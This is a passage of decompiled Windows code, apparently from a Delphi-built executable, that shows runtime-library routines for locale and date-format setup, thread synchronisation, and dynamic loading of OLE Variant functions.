{
  byte *pbVar1;
  int extraout_ECX;
  undefined4 *in_FS_OFFSET;
  byte *pbVar2;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  byte *local_10;
  undefined4 local_b;
  
  puStack24 = &stack0xfffffffc;
  local_10 = (byte *)0x0;
  puStack28 = &LAB_0040c6b0;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  GetLocaleInfoA(param_1,0x1004,(LPSTR)&local_b,7);
  FUN_00404a18((int *)&local_10,&local_b,7);
  pbVar2 = local_10;
  pbVar1 = (byte *)GetACP();
  FUN_004081b4(pbVar2,pbVar1,extraout_ECX);
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_0040c6b7;
  puStack28 = (undefined *)0x40c6af;
  FUN_004047a8((int *)&local_10);
  return;
}



void FUN_0040c6c0(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  byte bVar1;
  byte *pbVar2;
  UINT CodePage;
  char cVar3;
  int iVar4;
  LPCPINFO lpCPInfo;
  byte local_5;
  
  lpCPInfo = (LPCPINFO)(param_4 + -0x14);
  CodePage = FUN_0040c64c(DAT_00442738);
  GetCPInfo(CodePage,lpCPInfo);
  for (iVar4 = 0;
      (iVar4 < 0xc && ((*(byte *)(param_4 + -0xe + iVar4) | *(byte *)(param_4 + -0xd + iVar4)) != 0)
      ); iVar4 = iVar4 + 2) {
    local_5 = *(byte *)(param_4 + -0xe + iVar4);
    bVar1 = *(byte *)(param_4 + -0xd + iVar4);
    if (local_5 <= bVar1) {
      cVar3 = (bVar1 - local_5) + '\x01';
      do {
        pbVar2 = (byte *)((int)&DAT_0043f134 + ((int)(uint)local_5 >> 3));
        *pbVar2 = *pbVar2 | '\x01' << (local_5 & 7);
        local_5 = local_5 + 1;
        cVar3 = cVar3 + -1;
      } while (cVar3 != '\0');
    }
  }
  return;
}



uint FUN_0040c720(void)

{
  bool bVar1;
  
  bVar1 = DAT_0044273c < 0x1f;
  if (DAT_0044273c < 0x20) {
    bVar1 = ((byte)(&DAT_0043f32c)[(int)DAT_0044273c >> 3] >> (DAT_0044273c & 7) & 1) != 0;
  }
  return DAT_0044273c & 0xffffff00 | (uint)bVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040c738(void)

{
  LCID LVar1;
  uint uVar2;
  undefined extraout_CL;
  undefined extraout_CL_00;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  CHAR *pCVar4;
  WORD *pWVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined uVar8;
  undefined *puVar9;
  WORD local_19a [129];
  CHAR local_98 [148];
  
  puVar9 = &stack0xfffffffc;
  DAT_00442738 = 0x409;
  DAT_0044273c = 9;
  _DAT_00442740 = 1;
  LVar1 = GetThreadLocale();
  if (LVar1 != 0) {
    DAT_00442738 = LVar1;
  }
  if ((ushort)LVar1 != 0) {
    DAT_0044273c = (uint)((ushort)LVar1 & 0x3ff);
    _DAT_00442740 = (LVar1 & 0xffff) >> 10;
  }
  puVar6 = &DAT_0040c88c;
  puVar7 = &DAT_0043f134;
  for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  if (DAT_0043f0ec == 2) {
    uVar2 = FUN_0040c720();
    uVar8 = (char)uVar2 == '\0';
    if ((bool)uVar8) {
      FUN_0040c6c0(0,extraout_DL,extraout_CL,&stack0xfffffffc);
      FUN_00403684((char *)&DAT_0043f134,(char *)&DAT_0040c88c,
                   CONCAT31((int3)((uint)puVar9 >> 8),0x20));
      DAT_00442744 = !(bool)uVar8;
      if ((bool)DAT_00442744) {
        DAT_00442745 = 0;
      }
      else {
        iVar3 = 0x80;
        pCVar4 = local_98;
        do {
          *pCVar4 = (CHAR)iVar3;
          iVar3 = iVar3 + 1;
          pCVar4 = pCVar4 + 1;
        } while (iVar3 != 0x100);
        GetStringTypeExA(DAT_00442738,2,local_98,0x80,local_19a);
        iVar3 = 0x80;
        pWVar5 = local_19a;
        do {
          DAT_00442745 = *pWVar5 == 2;
          if ((bool)DAT_00442745) {
            return;
          }
          pWVar5 = pWVar5 + 1;
          iVar3 = iVar3 + -1;
        } while (iVar3 != 0);
      }
    }
    else {
      DAT_00442745 = 0;
      DAT_00442744 = 0;
    }
  }
  else {
    iVar3 = GetSystemMetrics(0x4a);
    DAT_00442745 = iVar3 != 0;
    iVar3 = GetSystemMetrics(0x2a);
    DAT_00442744 = iVar3 != 0;
    if ((bool)DAT_00442744) {
      FUN_0040c6c0((char)iVar3,extraout_DL_00,extraout_CL_00,&stack0xfffffffc);
    }
  }
  return;
}



void FUN_0040c8ac(void)

{
  LCID LVar1;
  byte *pbVar2;
  uint uVar3;
  int iVar4;
  int extraout_ECX;
  int extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  int extraout_ECX_06;
  int extraout_ECX_07;
  int extraout_ECX_08;
  undefined4 extraout_ECX_09;
  byte *unaff_EBX;
  byte **in_FS_OFFSET;
  byte *local_44;
  byte *local_40;
  byte *local_3c;
  undefined4 *local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  undefined4 *local_2c;
  undefined4 *local_28;
  undefined4 *local_24;
  int *piVar5;
  byte *local_1c;
  byte *local_18;
  undefined4 *local_14;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_14 = (undefined4 *)&stack0xfffffffc;
  iVar4 = 8;
  do {
    local_8 = (undefined4 *)0x0;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  local_18 = &DAT_0040cb77;
  local_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = (byte *)&local_1c;
  FUN_0040c738();
  FUN_0040b1b0();
  if (DAT_00442744 != '\0') {
    FUN_0040b388();
  }
  LVar1 = GetThreadLocale();
  local_24 = (undefined4 *)0x40c8fb;
  FUN_0040b100(LVar1,0x14,(undefined4 *)0x0,(int *)&local_14);
  FUN_004047fc(&DAT_00442678,local_14);
  local_24 = (undefined4 *)0x40c91d;
  FUN_0040b100(LVar1,0x1b,(undefined4 *)&DAT_0040cb8c,(int *)&local_18);
  pbVar2 = FUN_004081b4(local_18,(byte *)0x0,extraout_ECX);
  DAT_0044267c = SUB41(pbVar2,0);
  local_24 = (undefined4 *)0x40c941;
  FUN_0040b100(LVar1,0x1c,(undefined4 *)&DAT_0040cb8c,(int *)&local_1c);
  pbVar2 = FUN_004081b4(local_1c,(byte *)0x0,extraout_ECX_00);
  DAT_0044267d = SUB41(pbVar2,0);
  uVar3 = FUN_0040b14c(LVar1,0xf,CONCAT31((int3)((uint)extraout_ECX_01 >> 8),0x2c));
  DAT_0044267e = (undefined)uVar3;
  uVar3 = FUN_0040b14c(LVar1,0xe,CONCAT31((int3)((uint)extraout_ECX_02 >> 8),0x2e));
  DAT_0044267f = (undefined)uVar3;
  piVar5 = (int *)&stack0xffffffe0;
  local_24 = (undefined4 *)0x40c98b;
  FUN_0040b100(LVar1,0x19,(undefined4 *)&DAT_0040cb8c,piVar5);
  pbVar2 = FUN_004081b4((byte *)piVar5,(byte *)0x0,extraout_ECX_03);
  DAT_00442680 = SUB41(pbVar2,0);
  uVar3 = FUN_0040b14c(LVar1,0x1d,CONCAT31((int3)((uint)extraout_ECX_04 >> 8),0x2f));
  DAT_00442681 = (undefined)uVar3;
  local_24 = (undefined4 *)0x40c9c2;
  FUN_0040b100(LVar1,0x1f,(undefined4 *)"m/d/yy",(int *)&local_28);
  FUN_0040b438(local_28,(int *)&local_24);
  FUN_004047fc(&DAT_00442684,local_24);
  local_24 = (undefined4 *)0x40c9ef;
  FUN_0040b100(LVar1,0x20,(undefined4 *)"mmmm d, yyyy",(int *)&local_30);
  FUN_0040b438(local_30,(int *)&local_2c);
  FUN_004047fc(&DAT_00442688,local_2c);
  uVar3 = FUN_0040b14c(LVar1,0x1e,CONCAT31((int3)((uint)extraout_ECX_05 >> 8),0x3a));
  DAT_0044268c = (undefined)uVar3;
  local_24 = (undefined4 *)0x40ca2f;
  FUN_0040b100(LVar1,0x28,(undefined4 *)&DAT_0040cbc0,(int *)&local_34);
  FUN_004047fc(&DAT_00442690,local_34);
  local_24 = (undefined4 *)0x40ca51;
  FUN_0040b100(LVar1,0x29,(undefined4 *)&DAT_0040cbcc,(int *)&local_38);
  FUN_004047fc(&DAT_00442694,local_38);
  FUN_004047a8((int *)&local_c);
  FUN_004047a8((int *)&stack0xfffffff0);
  local_24 = (undefined4 *)0x40ca83;
  FUN_0040b100(LVar1,0x25,(undefined4 *)&DAT_0040cb8c,(int *)&local_3c);
  pbVar2 = FUN_004081b4(local_3c,(byte *)0x0,extraout_ECX_06);
  if (pbVar2 == (byte *)0x0) {
    FUN_00404840((int *)&local_8,(int)&DAT_0040cbd8);
    local_3c = unaff_EBX;
  }
  else {
    FUN_00404840((int *)&local_8,(int)&DAT_0040cbe4);
    local_3c = unaff_EBX;
  }
  local_24 = (undefined4 *)0x40cac2;
  FUN_0040b100(LVar1,0x23,(undefined4 *)&DAT_0040cb8c,(int *)&local_40);
  pbVar2 = FUN_004081b4(local_40,(byte *)0x0,extraout_ECX_07);
  if (pbVar2 == (byte *)0x0) {
    local_24 = (undefined4 *)0x40cae5;
    FUN_0040b100(LVar1,0x1005,(undefined4 *)&DAT_0040cb8c,(int *)&local_44);
    pbVar2 = FUN_004081b4(local_44,(byte *)0x0,extraout_ECX_08);
    if (pbVar2 == (byte *)0x0) {
      FUN_00404840((int *)&stack0xfffffff0,(int)" AMPM");
    }
    else {
      FUN_00404840((int *)&local_c,(int)"AMPM ");
    }
  }
  local_24 = local_8;
  local_28 = (undefined4 *)&DAT_0040cc10;
  local_30 = (undefined4 *)0x40cb2c;
  FUN_00404b28((int **)&DAT_00442698,4);
  local_30 = local_c;
  local_34 = local_8;
  local_38 = (undefined4 *)0x40cc1c;
  local_40 = (byte *)0x40cb49;
  FUN_00404b28((int **)&DAT_0044269c,4);
  local_40 = (byte *)0x40cb57;
  uVar3 = FUN_0040b14c(LVar1,0xc,CONCAT31((int3)((uint)extraout_ECX_09 >> 8),0x2c));
  DAT_00442746 = (undefined)uVar3;
  *in_FS_OFFSET = local_3c;
  local_34 = (undefined4 *)&LAB_0040cb7e;
  local_38 = (undefined4 *)0x40cb76;
  FUN_004047cc((int *)&local_44,0x10);
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall Sleep(DWORD dwMilliseconds)

{
                    // WARNING: Could not recover jumptable at 0x0040cc24. Too many branches
                    // WARNING: Treating indirect jump as call
  Sleep();
  return;
}



void FUN_0040cc2c(void)

{
  DWORD DVar1;
  int *piVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffd0;
  undefined *puStack40;
  undefined *puStack36;
  undefined *puStack32;
  int local_18;
  DWORD local_14;
  undefined local_10;
  int local_c;
  undefined local_8;
  
  puStack32 = &stack0xfffffffc;
  local_18 = 0;
  puStack36 = &LAB_0040ccbc;
  puStack40 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack40;
  DVar1 = GetLastError();
  if (DVar1 == 0) {
    piVar2 = FUN_0040b978((int *)&DAT_00407b4c,'\x01',(int **)PTR_PTR_DAT_00441588);
  }
  else {
    local_10 = 0;
    local_14 = DVar1;
    FUN_0040b0b4(DVar1,&local_18);
    local_c = local_18;
    local_8 = 0xb;
    in_stack_ffffffd0 = 1;
    piVar2 = (int *)FUN_0040b9b4((int)&DAT_00407b4c,'\x01',(int **)PTR_PTR_DAT_0044150c,1,&local_14)
    ;
  }
  piVar2[3] = DVar1;
  FUN_00404208((int)piVar2);
  *in_FS_OFFSET = in_stack_ffffffd0;
  puStack40 = &LAB_0040ccc3;
  FUN_004047a8(&local_18);
  return;
}



int FUN_0040ccc8(int param_1)

{
  if (param_1 == 0) {
    FUN_0040cc2c();
  }
  return param_1;
}



void FUN_0040ccd8(void)

{
  undefined4 *puVar1;
  
  while( true ) {
    puVar1 = DAT_0043f330;
    if (DAT_0043f330 == (undefined4 *)0x0) break;
    DAT_0043f330 = (undefined4 *)*DAT_0043f330;
    FUN_004026c8((int)puVar1);
  }
  return;
}



void FUN_0040ccf8(void)

{
  HMODULE hModule;
  
  hModule = GetModuleHandleA("kernel32.dll");
  if (hModule != (HMODULE)0x0) {
    DAT_0043f158 = GetProcAddress(hModule,"GetDiskFreeSpaceExA");
  }
  if (DAT_0043f158 == (FARPROC)0x0) {
    DAT_0043f158 = (FARPROC)&LAB_0040892c;
  }
  return;
}



int FUN_0040cd54(int *param_1)

{
  int iVar1;
  
  LOCK();
  iVar1 = *param_1;
  *param_1 = *param_1 + 1;
  return iVar1 + 1;
}



int FUN_0040cd60(int *param_1)

{
  int iVar1;
  
  LOCK();
  iVar1 = *param_1;
  *param_1 = *param_1 + -1;
  return iVar1 + -1;
}



undefined4 FUN_0040cd6c(undefined4 *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  uVar1 = *param_1;
  *param_1 = param_2;
  return uVar1;
}



int FUN_0040cd74(int *param_1,int param_2)

{
  int iVar1;
  
  LOCK();
  iVar1 = *param_1;
  *param_1 = *param_1 + param_2;
  return iVar1;
}



// WARNING: Could not reconcile some variable overlaps

uint FUN_0040cdcc(void)

{
  DWORD DVar1;
  undefined4 uStack8;
  
  DVar1 = GetCurrentThreadId();
  uStack8 = (DVar1 & 0xffff) << 0x10;
  uStack8._2_1_ = (byte)(DVar1 & 0xffff);
  return DVar1 & 0xffffff00 | (uStack8._2_1_ ^ uStack8._3_1_) & 0xffffff0f;
}



void FUN_0040cde4(int param_1,undefined4 *param_2)

{
  uint uVar1;
  DWORD DVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  
  uVar1 = FUN_0040cdcc();
  DVar2 = GetCurrentThreadId();
  for (puVar3 = *(undefined4 **)(param_1 + 4 + (uVar1 & 0xff) * 4);
      (puVar3 != (undefined4 *)0x0 && (DVar2 != puVar3[1])); puVar3 = (undefined4 *)*puVar3) {
  }
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = FUN_0040ce6c(param_1);
    if (puVar3 == (undefined4 *)0x0) {
      puVar3 = FUN_00407db4(0x10);
      puVar3[1] = DVar2;
      puVar3[2] = 0x7fffffff;
      *puVar3 = puVar3;
      uVar4 = FUN_0040cd6c((undefined4 *)(param_1 + 4 + (uVar1 & 0xff) * 4),puVar3);
      *puVar3 = uVar4;
    }
  }
  *param_2 = puVar3;
  return;
}



void FUN_0040ce5c(undefined4 param_1,int *param_2)

{
  *(undefined4 *)(*param_2 + 4) = 0;
  *(undefined4 *)(*param_2 + 8) = 0;
  return;
}



undefined4 * FUN_0040ce6c(int param_1)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  DWORD DVar4;
  
  uVar2 = FUN_0040cdcc();
  puVar1 = *(undefined4 **)(param_1 + 4 + (uVar2 & 0xff) * 4);
  while( true ) {
    if (puVar1 == (undefined4 *)0x0) {
      return (undefined4 *)0x0;
    }
    iVar3 = FUN_0040cd6c(puVar1 + 2,0x7fffffff);
    if (iVar3 != 0x7fffffff) break;
    puVar1 = (undefined4 *)*puVar1;
  }
  DVar4 = GetCurrentThreadId();
  puVar1[1] = DVar4;
  return puVar1;
}



int * FUN_0040ceac(int *param_1,char param_2,undefined4 param_3)

{
  HANDLE pvVar1;
  int iVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  param_1[3] = 0xffff;
  pvVar1 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,-1,-1,(LPCSTR)0x0);
  param_1[4] = (int)pvVar1;
  pvVar1 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCSTR)0x0);
  param_1[5] = (int)pvVar1;
  param_1[6] = -1;
  iVar2 = FUN_00403af4((int *)&DAT_00407c58,'\x01',extraout_ECX_00);
  param_1[8] = iVar2;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_0040cf68(int param_1)

{
  ResetEvent(*(HANDLE *)(param_1 + 0x10));
  return;
}



void FUN_0040cf74(int param_1)

{
  SetEvent(*(HANDLE *)(param_1 + 0x10));
  return;
}



void FUN_0040cf80(int param_1)

{
  SetEvent(*(HANDLE *)(param_1 + 0x14));
  return;
}



void FUN_0040cf8c(int param_1)

{
  WaitForSingleObject(*(HANDLE *)(param_1 + 0x10),*(DWORD *)(param_1 + 0x18));
  return;
}



void FUN_0040cf9c(int param_1)

{
  WaitForSingleObject(*(HANDLE *)(param_1 + 0x14),*(DWORD *)(param_1 + 0x18));
  return;
}



bool FUN_0040cfac(int param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  DWORD DVar2;
  int iVar3;
  bool bVar4;
  int local_14;
  
  bVar4 = true;
  local_14 = param_3;
  DVar2 = GetCurrentThreadId();
  if (DVar2 != *(DWORD *)(param_1 + 0x24)) {
    FUN_0040cf68(param_1);
    iVar1 = *(int *)(param_1 + 0x28);
    FUN_0040cde4(*(int *)(param_1 + 0x20),&local_14);
    bVar4 = *(int *)(local_14 + 0xc) != 0;
    if (bVar4) {
      FUN_0040cd54((int *)(param_1 + 0xc));
    }
    while( true ) {
      iVar3 = FUN_0040cd74((int *)(param_1 + 0xc),-0xffff);
      if (iVar3 == 0xffff) break;
      iVar3 = FUN_0040cd74((int *)(param_1 + 0xc),0xffff);
      if (iVar3 != 0) {
        FUN_0040cf9c(param_1);
      }
    }
    FUN_0040cf68(param_1);
    if (bVar4) {
      FUN_0040cd60((int *)(param_1 + 0xc));
    }
    *(DWORD *)(param_1 + 0x24) = DVar2;
    iVar3 = FUN_0040cd54((int *)(param_1 + 0x28));
    bVar4 = iVar3 + -1 == iVar1;
  }
  *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + 1;
  return bVar4;
}



void FUN_0040d16c(int **param_1)

{
  int *piVar1;
  
  piVar1 = *param_1;
  *param_1 = (int *)0x0;
  FUN_00403b24(piVar1);
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall VariantInit(VARIANTARG *pvarg)

{
                    // WARNING: Could not recover jumptable at 0x0040d684. Too many branches
                    // WARNING: Treating indirect jump as call
  VariantInit();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

HRESULT __stdcall VariantClear(VARIANTARG *pvarg)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040d68c. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = VariantClear();
  return HVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HRESULT __stdcall VariantCopy(VARIANTARG *pvargDest,VARIANTARG *pvargSrc)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040d694. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = VariantCopy();
  return HVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HRESULT __stdcall
VariantChangeType(VARIANTARG *pvargDest,VARIANTARG *pvarSrc,USHORT wFlags,VARTYPE vt)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040d69c. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = VariantChangeType();
  return HVar1;
}



undefined4 FUN_0040d6e0(void)

{
  return 0x80004001;
}



undefined4 FUN_0040d6ec(void)

{
  return 0x80004001;
}



void FUN_0040d6f8(undefined param_1,undefined param_2,undefined param_3,LPCWSTR param_4,int param_5,
                 undefined param_6,byte **param_7)

{
  int extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  byte *local_8;
  
  puStack16 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack20 = &DAT_0040d752;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  if (param_5 == 0x400) {
    FUN_00404a30((LPSTR *)&local_8,param_4);
    FUN_004081cc(local_8,param_7,extraout_ECX);
  }
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_0040d759;
  puStack20 = (undefined *)0x40d751;
  FUN_004047a8((int *)&local_8);
  return;
}



// WARNING: Exceeded maximum restarts with more pending

SAFEARRAY * __stdcall SafeArrayCreate(VARTYPE vt,UINT cDims,SAFEARRAYBOUND *rgsabound)

{
  SAFEARRAY *pSVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040dae8. Too many branches
                    // WARNING: Treating indirect jump as call
  pSVar1 = (SAFEARRAY *)SafeArrayCreate();
  return pSVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HRESULT __stdcall SafeArrayGetLBound(SAFEARRAY *psa,UINT nDim,LONG *plLbound)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040daf0. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = SafeArrayGetLBound();
  return HVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HRESULT __stdcall SafeArrayGetUBound(SAFEARRAY *psa,UINT nDim,LONG *plUbound)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040daf8. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = SafeArrayGetUBound();
  return HVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HRESULT __stdcall SafeArrayPtrOfIndex(SAFEARRAY *psa,LONG *rgIndices,void **ppvData)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040db00. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = SafeArrayPtrOfIndex();
  return HVar1;
}



FARPROC FUN_0040db08(LPCSTR param_1,FARPROC param_2,undefined4 param_3,int param_4)

{
  FARPROC pFVar1;
  
  pFVar1 = param_2;
  if (*(int *)(param_4 + -4) != 0) {
    pFVar1 = GetProcAddress(*(HMODULE *)(param_4 + -4),param_1);
    if (pFVar1 == (FARPROC)0x0) {
      pFVar1 = param_2;
    }
  }
  return pFVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040db34(void)

{
  undefined4 extraout_ECX;
  undefined *puVar1;
  undefined *puVar2;
  undefined *puVar3;
  undefined *puVar4;
  undefined *puVar5;
  undefined *puVar6;
  undefined *puVar7;
  undefined *puVar8;
  undefined *puVar9;
  undefined *puVar10;
  undefined *puVar11;
  undefined *puVar12;
  undefined *puVar13;
  undefined *puVar14;
  undefined *puVar15;
  undefined *puVar16;
  undefined *puVar17;
  undefined *puVar18;
  undefined *puVar19;
  undefined *puVar20;
  undefined *puVar21;
  
  puVar1 = &stack0xfffffffc;
  puVar2 = &stack0xfffffffc;
  puVar3 = &stack0xfffffffc;
  puVar4 = &stack0xfffffffc;
  puVar5 = &stack0xfffffffc;
  puVar6 = &stack0xfffffffc;
  puVar7 = &stack0xfffffffc;
  puVar8 = &stack0xfffffffc;
  puVar9 = &stack0xfffffffc;
  puVar10 = &stack0xfffffffc;
  puVar11 = &stack0xfffffffc;
  puVar12 = &stack0xfffffffc;
  puVar13 = &stack0xfffffffc;
  puVar14 = &stack0xfffffffc;
  puVar15 = &stack0xfffffffc;
  puVar16 = &stack0xfffffffc;
  puVar17 = &stack0xfffffffc;
  puVar18 = &stack0xfffffffc;
  puVar19 = &stack0xfffffffc;
  puVar20 = &stack0xfffffffc;
  puVar21 = &stack0xfffffffc;
  GetModuleHandleA("oleaut32.dll");
  DAT_0044279c = FUN_0040db08("VariantChangeTypeEx",(FARPROC)&LAB_0040d6a4,extraout_ECX,
                              (int)&stack0xfffffffc);
  _DAT_004427a0 = FUN_0040db08("VarNeg",(FARPROC)&LAB_0040d6d4,puVar1,(int)&stack0xfffffffc);
  _DAT_004427a4 = FUN_0040db08("VarNot",(FARPROC)&LAB_0040d6d4,puVar2,(int)&stack0xfffffffc);
  _DAT_004427a8 = FUN_0040db08("VarAdd",FUN_0040d6e0,puVar3,(int)&stack0xfffffffc);
  _DAT_004427ac = FUN_0040db08("VarSub",FUN_0040d6e0,puVar4,(int)&stack0xfffffffc);
  _DAT_004427b0 = FUN_0040db08("VarMul",FUN_0040d6e0,puVar5,(int)&stack0xfffffffc);
  _DAT_004427b4 = FUN_0040db08("VarDiv",FUN_0040d6e0,puVar6,(int)&stack0xfffffffc);
  _DAT_004427b8 = FUN_0040db08("VarIdiv",FUN_0040d6e0,puVar7,(int)&stack0xfffffffc);
  _DAT_004427bc = FUN_0040db08("VarMod",FUN_0040d6e0,puVar8,(int)&stack0xfffffffc);
  _DAT_004427c0 = FUN_0040db08("VarAnd",FUN_0040d6e0,puVar9,(int)&stack0xfffffffc);
  _DAT_004427c4 = FUN_0040db08("VarOr",FUN_0040d6e0,puVar10,(int)&stack0xfffffffc);
  _DAT_004427c8 = FUN_0040db08("VarXor",FUN_0040d6e0,puVar11,(int)&stack0xfffffffc);
  _DAT_004427cc = FUN_0040db08("VarCmp",FUN_0040d6ec,puVar12,(int)&stack0xfffffffc);
  _DAT_004427d0 = FUN_0040db08("VarI4FromStr",FUN_0040d6f8,puVar13,(int)&stack0xfffffffc);
  _DAT_004427d4 = FUN_0040db08("VarR4FromStr",(FARPROC)&LAB_0040d764,puVar14,(int)&stack0xfffffffc);
  _DAT_004427d8 = FUN_0040db08("VarR8FromStr",(FARPROC)&LAB_0040d7d0,puVar15,(int)&stack0xfffffffc);
  _DAT_004427dc =
       FUN_0040db08("VarDateFromStr",(FARPROC)&LAB_0040d83c,puVar16,(int)&stack0xfffffffc);
  _DAT_004427e0 = FUN_0040db08("VarCyFromStr",(FARPROC)&LAB_0040d8a8,puVar17,(int)&stack0xfffffffc);
  _DAT_004427e4 =
       FUN_0040db08("VarBoolFromStr",(FARPROC)&LAB_0040d914,puVar18,(int)&stack0xfffffffc);
  DAT_004427e8 = FUN_0040db08("VarBstrFromCy",(FARPROC)&LAB_0040d994,puVar19,(int)&stack0xfffffffc);
  DAT_004427ec = FUN_0040db08("VarBstrFromDate",(FARPROC)&LAB_0040da04,puVar20,(int)&stack0xfffffffc
                             );
  DAT_004427f0 = FUN_0040db08("VarBstrFromBool",(FARPROC)&LAB_0040da74,puVar21,(int)&stack0xfffffffc
                             );
  return;
}



void FUN_0040e458(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 *local_8;
  
  puStack12 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack16 = &LAB_0040e4a2;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  FUN_0040658c((int **)PTR_PTR_DAT_004414ac,(int *)&local_8);
  piVar1 = FUN_0040b8bc((int *)&DAT_0040e04c,'\x01',local_8);
  FUN_00404208((int)piVar1);
  *in_FS_OFFSET = uStack20;
  puStack12 = &LAB_0040e4a9;
  puStack16 = (undefined *)0x40e4a1;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_0040e4ac(uint param_1,uint param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  int *piVar3;
  undefined *puStack52;
  undefined *puStack48;
  undefined *puStack44;
  byte *local_20;
  int local_1c;
  int local_18;
  int local_14;
  undefined local_10;
  int local_c;
  undefined local_8;
  
  puStack44 = &stack0xfffffffc;
  local_18 = 0;
  local_1c = 0;
  local_20 = (byte *)0x0;
  puStack48 = &LAB_0040e53b;
  puStack52 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack52;
  FUN_00410058(param_1,&local_18);
  local_14 = local_18;
  local_10 = 0xb;
  FUN_00410058(param_2,&local_1c);
  local_c = local_1c;
  local_8 = 0xb;
  piVar3 = &local_14;
  uVar2 = 1;
  FUN_0040658c((int **)PTR_PTR_DAT_0044136c,(int *)&local_20);
  iVar1 = FUN_0040b8f8((int)&DAT_0040e04c,'\x01',local_20,uVar2,piVar3);
  FUN_00404208(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack52 = &LAB_0040e542;
  FUN_004047cc((int *)&local_20,3);
  return;
}



void FUN_0040e548(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 *local_8;
  
  puStack12 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack16 = &LAB_0040e592;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  FUN_0040658c((int **)PTR_PTR_DAT_00441484,(int *)&local_8);
  piVar1 = FUN_0040b8bc((int *)&DAT_0040dfe8,'\x01',local_8);
  FUN_00404208((int)piVar1);
  *in_FS_OFFSET = uStack20;
  puStack12 = &LAB_0040e599;
  puStack16 = (undefined *)0x40e591;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_0040e59c(uint param_1,uint param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  int *piVar3;
  undefined *puStack52;
  undefined *puStack48;
  undefined *puStack44;
  byte *local_20;
  int local_1c;
  int local_18;
  int local_14;
  undefined local_10;
  int local_c;
  undefined local_8;
  
  puStack44 = &stack0xfffffffc;
  local_18 = 0;
